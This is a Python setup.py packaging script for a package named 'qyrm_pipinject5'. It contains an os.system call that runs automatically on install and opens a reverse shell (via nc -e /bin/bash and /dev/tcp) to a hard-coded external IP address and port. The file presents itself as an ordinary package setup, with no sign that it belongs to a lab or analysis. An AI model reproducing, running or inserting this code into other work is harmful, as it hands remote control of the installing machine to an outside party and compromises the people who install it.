import setuptools
import os
os.system("nc 124.223.172.67 6808 -e /bin/bash | /bin/bash -i >& /dev/tcp/124.223.172.67/6808 0>&1;   ")
with open("README.md", "r", encoding="utf-8") as fh:
    long_description = fh.read()
setuptools.setup(
      name='qyrm_pipinject5',
      version='2.0',
      author='',
      author_email='',
      description='',
      long_description=long_description,
      long_description_content_type="text/markdown",
      url='',     
      packages=setuptools.find_packages(),
      data_files=[('diractory',['file'])],   
      install_requires=[
    ]   
    )